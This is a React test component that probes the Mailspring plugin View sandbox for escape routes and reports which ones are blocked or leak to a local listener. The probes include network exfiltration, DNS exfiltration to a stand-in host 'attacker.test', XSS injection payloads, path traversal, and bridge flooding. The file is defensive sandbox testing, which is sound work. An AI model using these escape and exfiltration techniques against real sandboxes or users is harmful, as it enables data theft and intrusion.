import React, { useEffect, useState } from 'react';
import { call } from '@mailspring/view';

// Adversarial View: tries every way out of the View sandbox (network, navigation, storage,
// workers, the bridge) and tabulates what the page itself observed.
// The page's view is not proof. Run a listener on 127.0.0.1:47123 (HTTP/WS) and :47124
// (UDP/TCP) and treat any hit there as a leak. Every probe below targets those ports.

const L = 'http://127.0.0.1:47123';
const WAIT = (ms) => new Promise((r) => setTimeout(r, ms));

const BLOCKED = (detail) => ({ status: 'blocked', detail });
const LEAK = (detail) => ({ status: 'LEAK', detail });
const INFO = (detail) => ({ status: 'info', detail });

async function settles(promise, ms = 3000) {
  return Promise.race([
    promise.then(
      (v) => ({ ok: true, v }),
      (e) => ({ ok: false, e: String(e && e.message ? e.message : e) })
    ),
    WAIT(ms).then(() => ({ ok: false, e: 'timeout' })),
  ]);
}

function elementLoads(tag, attrs, ms = 2500) {
  return new Promise((resolve) => {
    const el = document.createElement(tag);
    const timer = setTimeout(() => resolve('timeout'), ms);
    el.onload = () => {
      clearTimeout(timer);
      resolve('load');
    };
    el.onerror = () => {
      clearTimeout(timer);
      resolve('error');
    };
    Object.assign(el, attrs);
    document.getElementById('redteam-sandbox').appendChild(el);
  });
}

function styleProbe(css) {
  const style = document.createElement('style');
  style.textContent = css;
  document.head.appendChild(style);
  const div = document.createElement('div');
  div.className = 'redteam-probe';
  div.textContent = 'probe';
  document.getElementById('redteam-sandbox').appendChild(div);
  return WAIT(1500).then(() => INFO('see listener'));
}

const fetchProbe = (url, init) => async () => {
  const r = await settles(fetch(url, init));
  return r.ok ? LEAK(`fetch resolved status ${r.v.status}`) : BLOCKED(r.e);
};

const TESTS = [
  ['fetch → 127.0.0.1 listener', fetchProbe(`${L}/fetch`)],
  ['fetch no-cors → listener', fetchProbe(`${L}/fetch-nocors`, { mode: 'no-cors' })],
  [
    'fetch → MCP server :2587',
    fetchProbe('http://127.0.0.1:2587/mcp', { method: 'POST', mode: 'no-cors' }),
  ],
  ['fetch → https://example.com', fetchProbe('https://example.com/')],
  ['fetch → file:///etc/hosts', fetchProbe('file:///etc/hosts')],
  ['fetch → mailspring://', fetchProbe('mailspring://plugins/')],
  ['fetch → other View origin', fetchProbe('mailspring-view://hello/view.js')],
  ['fetch → own manifest.json', fetchProbe('/manifest.json')],
  ['fetch → own View.jsx source', fetchProbe('/View.jsx')],
  ['fetch → path traversal', fetchProbe('/_lib/..%2f..%2f..%2fpackage.json')],
  ['fetch → preload source', fetchProbe('/_runtime/bridge.preload.js')],
  [
    'XHR → listener',
    () =>
      new Promise((resolve) => {
        const xhr = new XMLHttpRequest();
        try {
          xhr.open('GET', `${L}/xhr`);
          xhr.onload = () => resolve(LEAK('xhr loaded'));
          xhr.onerror = () => resolve(BLOCKED('xhr error'));
          xhr.send();
        } catch (e) {
          resolve(BLOCKED(e.message));
        }
      }),
  ],
  [
    '<img> → listener',
    async () => {
      const r = await elementLoads('img', { src: `${L}/img` });
      return r === 'load' ? LEAK(r) : BLOCKED(r);
    },
  ],
  [
    '<img> DNS exfil → secret.attacker.test',
    async () => {
      const r = await elementLoads('img', { src: 'http://c2VjcmV0.attacker.test/x.png' });
      return r === 'load' ? LEAK(r) : BLOCKED(`${r} (DNS not observable here)`);
    },
  ],
  [
    'CSS url() / @font-face / @import',
    () =>
      styleProbe(`
    @import url("${L}/css-import");
    @font-face { font-family: rt; src: url("${L}/css-font"); }
    .redteam-probe { background: url("${L}/css-url"); font-family: rt; }
  `),
  ],
  [
    'WebSocket → listener',
    () =>
      new Promise((resolve) => {
        try {
          const ws = new WebSocket('ws://127.0.0.1:47123/ws');
          ws.onopen = () => resolve(LEAK('open'));
          ws.onerror = () => resolve(BLOCKED('error'));
          setTimeout(() => resolve(BLOCKED('timeout')), 2500);
        } catch (e) {
          resolve(BLOCKED(e.message));
        }
      }),
  ],
  [
    'EventSource → listener',
    () =>
      new Promise((resolve) => {
        try {
          const es = new EventSource(`${L}/sse`);
          es.onmessage = () => {
            es.close();
            resolve(LEAK('message'));
          };
          es.onerror = () => {
            es.close();
            resolve(BLOCKED('error'));
          };
          setTimeout(() => resolve(BLOCKED('timeout')), 2500);
        } catch (e) {
          resolve(BLOCKED(e.message));
        }
      }),
  ],
  [
    'sendBeacon → listener',
    async () => {
      try {
        const queued = navigator.sendBeacon(`${L}/beacon`, 'secret');
        await WAIT(1000);
        return INFO(`queued=${queued}; see listener`);
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    '<link> prefetch / preconnect / dns-prefetch',
    async () => {
      for (const [rel, href] of [
        ['prefetch', `${L}/prefetch`],
        ['preconnect', `${L}/`],
        ['dns-prefetch', '//dnsprefetch.attacker.test'],
        ['preload', `${L}/preload`],
      ]) {
        const link = document.createElement('link');
        link.rel = rel;
        link.href = href;
        if (rel === 'preload') link.as = 'image';
        document.head.appendChild(link);
      }
      await WAIT(1500);
      return INFO('see listener');
    },
  ],
  [
    'WebRTC STUN/TURN → listener',
    async () => {
      if (typeof RTCPeerConnection === 'undefined') return BLOCKED('RTCPeerConnection undefined');
      try {
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:127.0.0.1:47124' },
            { urls: 'turn:127.0.0.1:47124?transport=tcp', username: 'u', credential: 'p' },
            { urls: 'stun:stun.l.google.com:19302' },
          ],
        });
        const candidates = [];
        pc.onicecandidate = (e) =>
          e.candidate && candidates.push(e.candidate.candidate.split(' ').slice(4, 8).join(' '));
        pc.createDataChannel('x');
        await pc.setLocalDescription(await pc.createOffer());
        await WAIT(4000);
        pc.close();
        const srflx = candidates.filter((c) => c.includes('srflx') || c.includes('relay'));
        return srflx.length
          ? LEAK(`reflexive/relay candidates: ${srflx.join(' | ')}`)
          : INFO(
              `${candidates.length} candidates (${candidates.join(' | ') || 'none'}); see listener`
            );
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    'window.open → listener',
    async () => {
      try {
        const w = window.open(`${L}/window-open`);
        await WAIT(1000);
        return w ? LEAK('window object returned') : BLOCKED('null');
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    '<a target=_blank> click',
    async () => {
      const a = document.createElement('a');
      a.href = `${L}/anchor-blank`;
      a.target = '_blank';
      document.body.appendChild(a);
      a.click();
      await WAIT(1000);
      return INFO('see listener');
    },
  ],
  [
    '<a download> blob',
    async () => {
      const a = document.createElement('a');
      a.href = URL.createObjectURL(new Blob(['payload'], { type: 'text/plain' }));
      a.download = 'redteam.txt';
      document.body.appendChild(a);
      a.click();
      await WAIT(1000);
      return INFO('check ~/Downloads and for a save dialog');
    },
  ],
  [
    'form POST target=_blank',
    async () => {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = `${L}/form-blank`;
      form.target = '_blank';
      document.body.appendChild(form);
      try {
        form.submit();
      } catch (e) {
        return BLOCKED(e.message);
      }
      await WAIT(1000);
      return INFO('see listener');
    },
  ],
  [
    '<iframe> → listener / file / mailspring / other View',
    async () => {
      const results = [];
      for (const src of [
        `${L}/iframe`,
        'file:///etc/hosts',
        'mailspring://plugins/',
        'mailspring-view://hello/',
      ]) {
        const frame = document.createElement('iframe');
        frame.src = src;
        document.getElementById('redteam-sandbox').appendChild(frame);
        await WAIT(800);
        let readable = 'unreadable';
        try {
          readable =
            frame.contentDocument && frame.contentDocument.body
              ? `readable:${frame.contentDocument.body.innerText.slice(0, 20)}`
              : 'no-doc';
        } catch (e) {
          readable = 'cross-origin';
        }
        results.push(`${src.slice(0, 24)}→${readable}`);
      }
      const leaked = results.some(
        (r) =>
          r.includes('readable:') &&
          !r.includes('readable:\u0000') &&
          r.split('readable:')[1].trim().length > 0
      );
      return leaked ? LEAK(results.join('; ')) : INFO(results.join('; '));
    },
  ],
  [
    '<iframe> own bundle: manifest / source / traversal / preload',
    async () => {
      const out = [];
      for (const src of [
        '/manifest.json',
        '/View.jsx',
        '/_lib/..%2f..%2f..%2fpackage.json',
        '/_lib/%2e%2e/%2e%2e/%2e%2e/package.json',
        '/_runtime/bridge.preload.js',
        '/..%2f..%2fhello/View.jsx',
      ]) {
        const frame = document.createElement('iframe');
        frame.src = src;
        document.getElementById('redteam-sandbox').appendChild(frame);
        await WAIT(500);
        let text = '';
        try {
          text = frame.contentDocument.body ? frame.contentDocument.body.innerText : '';
        } catch (e) {
          text = 'cross-origin';
        }
        out.push(`${src}→${text.slice(0, 16).replace(/\s+/g, ' ') || 'empty'}`);
      }
      const leaked = out.some(
        (o) => !o.endsWith('Not Found') && !o.endsWith('empty') && !o.endsWith('cross-origin')
      );
      return leaked ? LEAK(out.join('; ')) : BLOCKED(out.join('; '));
    },
  ],
  [
    'alert() native dialog',
    async () => {
      const t = Date.now();
      try {
        window.alert('Mailspring: your session expired');
      } catch (e) {
        return BLOCKED(e.message);
      }
      const ms = Date.now() - t;
      return ms < 200
        ? BLOCKED(`returned in ${ms}ms (dialogs disabled)`)
        : LEAK(`blocked for ${ms}ms — a dialog was shown`);
    },
  ],
  [
    'about:blank iframe → fresh fetch',
    async () => {
      const frame = document.createElement('iframe');
      document.getElementById('redteam-sandbox').appendChild(frame);
      try {
        const r = await settles(frame.contentWindow.fetch(`${L}/blank-iframe-fetch`));
        return r.ok ? LEAK('fetch resolved') : BLOCKED(r.e);
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    'Worker importScripts / fetch',
    async () => {
      try {
        const src = `try{importScripts('${L}/worker-import')}catch(e){}; fetch('${L}/worker-fetch').then(()=>postMessage('LEAK'),()=>postMessage('blocked'))`;
        const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
        const msg = await new Promise((r) => {
          w.onmessage = (e) => r(e.data);
          w.onerror = (e) => r(`error:${e.message}`);
          setTimeout(() => r('timeout'), 2500);
        });
        w.terminate();
        return msg === 'LEAK' ? LEAK('worker fetch resolved') : BLOCKED(msg);
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    'SharedWorker',
    async () => {
      if (typeof SharedWorker === 'undefined') return BLOCKED('undefined');
      try {
        const src = `fetch('${L}/sharedworker-fetch').catch(()=>{})`;
        new SharedWorker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
        await WAIT(1500);
        return INFO('see listener');
      } catch (e) {
        return BLOCKED(e.message);
      }
    },
  ],
  [
    'Service worker register',
    async () => {
      if (!navigator.serviceWorker) return BLOCKED('navigator.serviceWorker undefined');
      const r = await settles(navigator.serviceWorker.register('/view.js'));
      return r.ok ? LEAK('registered') : BLOCKED(r.e);
    },
  ],
  [
    'Node/Electron globals',
    async () => {
      const present = [
        'require',
        'process',
        'module',
        'Buffer',
        'global',
        'electron',
        '__dirname',
        'ipcRenderer',
      ].filter((g) => typeof window[g] !== 'undefined' && !(g === 'module'));
      return present.length ? LEAK(present.join(',')) : BLOCKED('none present');
    },
  ],
  [
    'Tamper with window.mailspring',
    async () => {
      const before = window.mailspring.call;
      try {
        window.mailspring.call = () => 'hijacked';
      } catch (e) {
        /* frozen */
      }
      try {
        window.mailspring = { call: () => 'replaced' };
      } catch (e) {
        /* non-writable */
      }
      const tampered = window.mailspring.call !== before;
      Object.prototype.__rtPolluted = true;
      Array.prototype.__rtPolluted = true;
      let r;
      try {
        r = await call('theme.get');
      } catch (e) {
        r = e;
      }
      delete Object.prototype.__rtPolluted;
      delete Array.prototype.__rtPolluted;
      return tampered
        ? INFO('window.mailspring replaceable in main world (only affects the View itself)')
        : BLOCKED(`frozen; bridge still works: ${!!r}`);
    },
  ],
  [
    'Malformed bridge calls',
    async () => {
      const out = [];
      for (const [m, p] of [
        [undefined, undefined],
        ['__proto__', {}],
        ['constructor', {}],
        ['hasOwnProperty', {}],
        ['toString', {}],
        ['threads.subscribe', 'not-an-object'],
        ['threads.subscribe', { subscriptionId: { toString: 1 } }],
        ['ui.showThread', { threadId: ['a'] }],
      ]) {
        try {
          const r = await window.mailspring.call(m, p);
          out.push(`${String(m)}:${r.error ? r.error.code : 'ok'}`);
        } catch (e) {
          out.push(`${String(m)}:throw(${e.message.slice(0, 30)})`);
        }
      }
      try {
        await window.mailspring.call('theme.get', { f: () => 1 });
        out.push('fn:ok');
      } catch (e) {
        out.push('fn:throw');
      }
      const internal = out.filter(
        (o) => o.includes(':internal') || (o.endsWith(':ok') && !o.startsWith('fn'))
      );
      return internal.length ? LEAK(out.join(' ')) : BLOCKED(out.join(' '));
    },
  ],
  [
    'Huge bridge payload (32 MB)',
    async () => {
      const big = 'x'.repeat(32 * 1024 * 1024);
      const t = Date.now();
      const r = await settles(window.mailspring.call('theme.get', { big }), 8000);
      return INFO(
        `${r.ok ? (r.v.error ? r.v.error.code : 'accepted') : r.e} in ${Date.now() - t}ms`
      );
    },
  ],
  [
    'Bridge flood (5,000 calls)',
    async () => {
      const t = Date.now();
      const rs = await Promise.all(
        Array.from({ length: 5000 }, () => window.mailspring.call('nope', {}))
      );
      return INFO(`${rs.length} replies in ${Date.now() - t}ms`);
    },
  ],
  [
    'Unpermitted bridge method (manifest grants nothing)',
    async () => {
      const r = await settles(
        call('threads.subscribe', { subscriptionId: 'rt', query: 'in:inbox', limit: 1 })
      );
      if (r.ok) {
        call('subscription.cancel', { subscriptionId: 'rt' }).catch(() => {});
      }
      return r.ok ? LEAK('threads.subscribe allowed without mail.read') : BLOCKED(r.e);
    },
  ],
  [
    'eval / new Function (CSP)',
    async () => {
      const out = [];
      try {
        out.push(`eval=${eval('1+1')}`);
      } catch (e) {
        out.push('eval blocked');
      }
      try {
        out.push(`Function=${new Function('return 2')()}`);
      } catch (e) {
        out.push('Function blocked');
      }
      try {
        setTimeout('window.__rtTimeoutString = 1', 0);
        await WAIT(100);
        out.push(`setTimeout(string)=${!!window.__rtTimeoutString}`);
      } catch (e) {
        out.push('setTimeout(string) blocked');
      }
      return out.some((o) => o.includes('=2') || o.includes('=true'))
        ? LEAK(out.join(', '))
        : BLOCKED(out.join(', '));
    },
  ],
  [
    'innerHTML script injection (email subject)',
    async () => {
      const div = document.createElement('div');
      div.innerHTML =
        '<img src="data:," onerror="window.__rtXss1=1" onload="window.__rtXss1=1"><script>window.__rtXss2=1<\/script><svg onload="window.__rtXss3=1"></svg>';
      document.getElementById('redteam-sandbox').appendChild(div);
      const frame = document.createElement('iframe');
      frame.srcdoc = '<script>parent.__rtXss4=1<\/script>';
      document.getElementById('redteam-sandbox').appendChild(frame);
      await WAIT(800);
      const fired = [1, 2, 3, 4].filter((n) => window[`__rtXss${n}`]);
      return fired.length ? LEAK(`handlers ran: ${fired.join(',')}`) : BLOCKED('no handler ran');
    },
  ],
  [
    'Permissions (notify, geo, mic, clipboard)',
    async () => {
      const out = [];
      try {
        out.push(`Notification=${await Notification.requestPermission()}`);
      } catch (e) {
        out.push('Notification err');
      }
      const geo = await settles(
        new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej)),
        2000
      );
      out.push(`geo=${geo.ok ? 'GRANTED' : 'denied'}`);
      const mic = await settles(
        navigator.mediaDevices
          ? navigator.mediaDevices.getUserMedia({ audio: true })
          : Promise.reject('none'),
        2000
      );
      out.push(`mic=${mic.ok ? 'GRANTED' : 'denied'}`);
      const clip = await settles(navigator.clipboard.readText(), 2000);
      out.push(`clipboard.read=${clip.ok ? 'GRANTED' : 'denied'}`);
      return out.some((o) => o.includes('GRANTED') || o.includes('=granted'))
        ? LEAK(out.join(', '))
        : BLOCKED(out.join(', '));
    },
  ],
  [
    'top navigation (location / meta refresh)',
    async () => {
      const meta = document.createElement('meta');
      meta.httpEquiv = 'refresh';
      meta.content = `0;url=${L}/meta-refresh`;
      document.head.appendChild(meta);
      await WAIT(800);
      try {
        window.location.href = `${L}/location-assign`;
      } catch (e) {
        /* blocked */
      }
      await WAIT(1200);
      return location.protocol === 'mailspring-view:'
        ? BLOCKED(`still at ${location.href}`)
        : LEAK(location.href);
    },
  ],
  [
    'form POST top-level',
    async () => {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = `${L}/form-self`;
      document.body.appendChild(form);
      try {
        form.submit();
      } catch (e) {
        return BLOCKED(e.message);
      }
      await WAIT(1200);
      return location.protocol === 'mailspring-view:'
        ? BLOCKED('still here; see listener')
        : LEAK(location.href);
    },
  ],
];

const COLORS = {
  blocked: 'text-green-700',
  LEAK: 'text-red-600 font-bold',
  info: 'text-amber-700',
  running: 'text-gray-500',
};

export default function RedTeam() {
  const [rows, setRows] = useState(
    TESTS.map(([name]) => ({ name, status: 'running', detail: '' }))
  );
  useEffect(() => {
    (async () => {
      const results = [];
      for (let i = 0; i < TESTS.length; i++) {
        const [name, run] = TESTS[i];
        let result;
        try {
          result = await run();
        } catch (e) {
          result = INFO(`threw: ${e.message}`);
        }
        results.push({ name, ...result });
        setRows((prev) => prev.map((r, j) => (j === i ? { name, ...result } : r)));
      }
      window.__redteamResults = results;
    })();
  }, []);

  return (
    <div className="p-4 text-xs">
      <h1 className="text-lg font-semibold mb-2">Sandbox red team</h1>
      <p className="mb-3 text-gray-600">
        The listener on 127.0.0.1:47123/47124 is ground truth. "info" rows are decided there.
      </p>
      <table className="w-full table-fixed">
        <colgroup>
          <col style={{ width: '32%' }} />
          <col style={{ width: '13%' }} />
          <col />
        </colgroup>
        <tbody>
          {rows.map((r) => (
            <tr key={r.name} className="border-b border-gray-200 align-top">
              <td className="py-1 pr-2">{r.name}</td>
              <td className={`py-1 pr-2 ${COLORS[r.status] || ''}`}>{r.status}</td>
              <td className="py-1 break-all text-gray-600">{r.detail}</td>
            </tr>
          ))}
        </tbody>
      </table>
      <div id="redteam-sandbox" style={{ height: 1, overflow: 'hidden' }} />
    </div>
  );
}
